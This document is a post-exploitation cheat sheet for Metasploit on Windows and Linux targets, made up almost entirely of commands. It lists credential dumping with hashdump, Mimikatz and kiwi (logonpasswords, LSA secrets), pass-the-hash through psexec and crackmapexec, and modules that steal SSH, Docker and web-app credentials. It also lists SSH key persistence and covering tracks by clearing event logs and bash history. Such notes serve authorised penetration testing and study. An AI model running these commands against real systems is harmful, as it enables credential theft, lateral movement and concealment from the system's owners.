# Post Exploitation With Metasploit

## Post Exploitation With Metasploit

## Windows Post Exploitation

```bash
#meterpreter commands
sysinfo
getuid
getsystem
hashdump
show_mount
ps
migrate PID
migrate -N explorer.exe
clearev # to clear tracks
```

### Metasploit Modules For Windows

```bash
#used to automate the enumeration of the current user privileges.
use post/windows/gather/win_privs
#enumerates a list of currently and previous logged on users.
use post/windows/gather/enum_logged_on_users
#This module will tell you whether the target system is a VM or container.
use post/windows/gather/checkvm
#This module enumerates a list of installed application/programs on the target system.
use post/windows/gather/enum_applications
#module to enumerate a list of excluded AV paths on the target system.
use post/windows/gather/enum_av_excluded
#enumerate a list of computers connected to the same LAN that the target is a part of.
use post/windows/gather/enum_computers
#enumerate a list of shares
use post/windows/gather/enum_shares
```

### Unattended Windows Setup

#### Meterpreter Shell

```bash
search -f unattend.xml
download unattend.xml
```

### Mimikatz

#### Kiwi

```bash
load kiwi
?
creds_all
lsa_dump_sam
```

```bash
shell
cd C:\
mkdir Temp
cd Temp
upload /usr/share/mimikatz/x64/mimikatz.exe
.\mimikatz.exe
```

```bash
#inside mimikatz
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

### Pass The Hash

#### Meterpreter

```bash
migrate -N lsass.exe
load kiwi
lsa_dump_sam
$NTLMHASH
hashdump #copy all
```

#### psexec

```bash
use exploit/windows/smb/psexec
set lport
set rhosts
set smbuser administrator
set smbpass $NTLMHASH
set target Native\ upload
run
```

#### crackmapexec

```bash
#with hash
crackmapexec smb $ip -u Administrator -H "$NTLM-HASH"
crackmapexec smb $ip -u Administrator -H "$NTLM-HASH" -x "ipconfig"
```

## Linux Post Exploitation

### Enumeration Modules For Linux

```bash
post/linux/gather/enum_configs
post/multi/gather/env
post/linux/gather/enum_network
post/linux/gather/enum_protections
post/linux/gather/enum_system
post/linux/gather/checkcontainer
post/linux/gather/checkvm
post/linux/gather/enum_users_history
post/multi/manage/system_session
post/linux/manage/download_exec
```

### Creds Dumping Module

```bash
post/multi/gather/ssh_creds
post/multi/gather/docker_creds
post/linux/gather/hashdump
post/linux/gather/ecryptfs_creds
post/linux/gather/enum_psk
post/linux/gather/enum_xchat
post/linux/gather/phpmyadmin_credsteal
post/linux/gather/pptpd_chap_secrets
post/linux/manage/sshkey_persistence
```

**Clearing tracks from linux machine**

```bash
cat /dev/null > ~/.bash_history
```

